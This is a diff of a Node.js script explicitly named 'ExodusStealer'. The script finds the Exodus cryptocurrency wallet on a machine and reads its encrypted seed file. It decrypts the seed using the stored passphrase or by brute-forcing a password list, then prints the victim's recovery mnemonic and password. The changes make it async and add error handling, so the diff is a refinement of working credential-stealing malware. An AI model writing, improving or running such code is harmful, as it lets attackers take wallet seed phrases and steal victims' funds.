@@ -16,12 +16,19 @@ function shrink(secoData) {
     return secoData.slice(4, t + 4);
 }
 
-function decrypt(secoPath, password) {
-    const fileBuffer = fs.readFileSync(secoPath);
-    const decrypted = seco.decryptData(fileBuffer, password).data;
-    const shrinked = shrink(decrypted);
-    const gunzipped = zlib.gunzipSync(shrinked);
-    return bs.fromBuffer(gunzipped).mnemonicString;
+async function decryptAndExtractMnemonic(encryptedData, password) {
+    try {
+        const { data: decrypted } = await seco.decrypt(encryptedData, password);
+        const shrinked = shrink(decrypted);
+        const gunzipped = zlib.gunzipSync(shrinked);
+        const seed = bs.fromBuffer(gunzipped);
+        if (!seed || !seed.mnemonicString) {
+            throw new Error("Failed to extract mnemonic from buffer.");
+        }
+        return seed.mnemonicString;
+    } catch (error) {
+        throw new Error(`Failed to process seed data: ${error.message}`);
+    }
 }
 
 function locateExodus() {
@@ -55,7 +62,6 @@ function locateExodus() {
         return { exodus: false, error: `Filesystem error during Exodus location: ${error.message}` };
     }
 }
-
 
 async function BruteForcePassword(seedFilePath, passwords) {
     let seedData;
@@ -97,62 +103,106 @@ async function BruteForcePassword(seedFilePath, passwords) {
     };
 }
 
-function exodusStealer(passwords) {
+async function ExodusStealer(passwords) {
     const exodusInfo = locateExodus();
 
-    if (!exodusInfo.found) {
-        console.log("[Info] Exodus wallet not found.");
-        return { found: false };
+    if (!exodusInfo.exodus) {
+        return { success: false, ...exodusInfo };
     }
 
-    console.log(`[Info] Exodus wallet found. Password required: ${exodusInfo.passwordRequired}`);
+    let seedData;
+    try {
+        seedData = fs.readFileSync(exodusInfo.path);
+    } catch (error) {
+        return { success: false, error: `Failed to read seed file '${exodusInfo.path}': ${error.message}`, exodusInfo };
+    }
 
     if (!exodusInfo.passwordRequired) {
-        console.log(`[Info] Using saved passphrase.`);
-        const passphrase = JSON.parse(fs.readFileSync(exodusInfo.passphrasePath, "utf8")).passphrase;
-        const mnemonic = decrypt(exodusInfo.seedPath, passphrase);
-        return { found: true, mnemonic };
+        const passphrasePath = path.join(exodusInfo.walletDir, "passphrase.json");
+        try {
+            const passphraseJson = fs.readFileSync(passphrasePath, "utf8");
+            const passphraseData = JSON.parse(passphraseJson);
+            const passphrase = passphraseData.passphrase;
+
+            if (!passphrase) {
+                return { success: false, error: "Passphrase file found but content is invalid.", exodusInfo };
+            }
+
+            const mnemonic = await decryptAndExtractMnemonic(seedData, passphrase);
+            return { success: true, exodusInfo, mnemonic, password: "[Stored Passphrase]" };
+        } catch (error) {
+            return { success: false, error: `Error processing stored passphrase: ${error.message}`, exodusInfo };
+        }
     }
 
-    console.log(`[Info] Starting brute force...`);
-
-    const brute = bruteForcePassword(exodusInfo.seedPath, passwords);
-
-    if (brute.success) {
-        const mnemonic = decrypt(exodusInfo.seedPath, brute.password);
-        return {
-            found: true,
-            mnemonic,
-            password: brute.password,
-            time: brute.time,
-            tried: brute.tried
-        };
+    const bforced = await BruteForcePassword(exodusInfo.path, passwords);
+    if (bforced.success) {
+        try {
+            const mnemonic = await decryptAndExtractMnemonic(seedData, bforced.password);
+            return {
+                success: true,
+                exodusInfo,
+                mnemonic,
+                password: bforced.password,
+                bruteForceInfo: bforced,
+            };
+        } catch (error) {
+            return {
+                success: false,
+                error: `Decryption failed after brute-force: ${error.message}`,
+                exodusInfo,
+                bruteForceInfo: bforced,
+            };
+        }
     }
-
-    return { found: true, error: brute.error, tried: brute.tried };
+    return { success: false, error: `Brute-force failed: ${bforced.error}`, bruteForceInfo: bforced, exodusInfo };
 }
 
-function readPasswordList(filePath) {
-    return fs.readFileSync(filePath, "utf8")
-        .split(/\r?\n/)
-        .filter(line => line.trim().length > 0);
-}
+(async () => {
+    try {
+        const passwordListPath = "list.txt";
+        let passwords = [];
+        if (fs.existsSync(passwordListPath)) {
+            passwords = fs.readFileSync(passwordListPath, "utf8")
+                .split(/\r?\n/)
+                .map((pw) => pw.trim())
+                .filter((pw) => pw.length > 0);
+            if (passwords.length > 0) {
+                console.log(`Loaded ${passwords.length} passwords from ${passwordListPath}`);
+            }
+        } else {
+            console.warn(`Warning: Password list '${passwordListPath}' not found. Proceeding without brute-force.`);
+        }
 
-// Example usage:
-const passwords = readPasswordList("list.txt");
-const result = exodusStealer(passwords);
+        const result = await ExodusStealer(passwords);
 
-console.log(result);
-
-module.exports = {
-    locateExodus,
-    bruteForcePassword,
-    exodusStealer,
-    readPasswordList,
-    decrypt
-};
-
-
-
-
-
+        console.log("\n--- Result ---");
+        if (result.success) {
+            console.log("Status: Success!");
+            console.log("Exodus Found:", result.exodusInfo.exodus);
+            console.log("Seed Path:", result.exodusInfo.path);
+            console.log("Password:", result.password);
+            console.log("Mnemonic:", result.mnemonic);
+            if (result.bruteForceInfo) {
+                console.log(
+                    `Brute-Force Time: ${result.bruteForceInfo.timeFormatted} (${result.bruteForceInfo.tried_passwords} passwords tried)`
+                );
+            }
+        } else {
+            console.error("Status: Failed!");
+            console.error("Exodus Found:", result.exodusInfo?.exodus ?? false);
+            if (result.exodusInfo?.path) console.error("Seed Path:", result.exodusInfo.path);
+            console.error("Error:", result.error);
+            if (result.bruteForceInfo) {
+                console.error(
+                    `Brute-Force Info: ${result.bruteForceInfo.tried_passwords} passwords tried in ${result.bruteForceInfo.timeMs}ms`
+                );
+            }
+        }
+        console.log("--------------");
+    } catch (error) {
+        console.error("\n--- Critical Error ---");
+        console.error("Unexpected error:", error.message);
+        console.error("----------------------");
+    }
+})();
